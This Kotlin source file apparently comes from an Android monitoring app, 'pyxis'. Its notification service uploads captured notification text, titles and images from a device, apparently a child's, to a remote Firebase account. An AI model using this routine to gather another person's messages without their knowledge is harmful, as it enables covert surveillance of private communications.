package com.virajbhartiya.pyxis.services.notificationService

import android.content.Context
import android.graphics.Bitmap
import android.net.Uri
import com.virajbhartiya.pyxis.data.model.NotificationMessages
import com.virajbhartiya.pyxis.data.rxFirebase.InterfaceFirebase
import com.virajbhartiya.pyxis.utils.ConstFun.getDateTime
import com.virajbhartiya.pyxis.utils.Consts
import com.virajbhartiya.pyxis.utils.Consts.CHILD_PERMISSION
import com.virajbhartiya.pyxis.utils.Consts.DATA
import com.virajbhartiya.pyxis.utils.Consts.NOTIFICATION_MESSAGE
import com.virajbhartiya.pyxis.utils.FileHelper
import com.virajbhartiya.pyxis.utils.FileHelper.getFileNameBitmap
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject


class InteractorNotificationService @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {

    private var disposable: CompositeDisposable = CompositeDisposable()

    override fun setRunService(run: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$CHILD_PERMISSION").setValue(run)
    }

    override fun getNotificationExists(id: String, exec: () -> Unit) {
        if (firebase.getUser()!=null) {
            disposable.add(firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id)
                    .map { value -> value.exists() }
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ if (!it) exec() },{ e(Consts.TAG,it.message.toString()) }))
        }
    }

    override fun setDataMessageNotification(type: Int, text: String?, title: String?,nameImage: String?,image:Bitmap?) {
        if (image!=null){

            val imageFile = image.getFileNameBitmap(context,nameImage!!)
            val uri = Uri.fromFile(File(imageFile))
            disposable.add(firebase.putFile("$NOTIFICATION_MESSAGE/$nameImage",uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            setData(type,text,title,nameImage,it.result.toString())
                            FileHelper.deleteFile(imageFile)
                        }
                    }, { error ->
                        e(Consts.TAG, error.message.toString())
                        FileHelper.deleteFile(imageFile)
                    }))

        }else setData(type,text,title,"-","-")
    }

    private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
        val message = NotificationMessages(text,title,type,getDateTime(),nameImage,urlImage)
        firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$DATA").push().setValue(message)
    }

}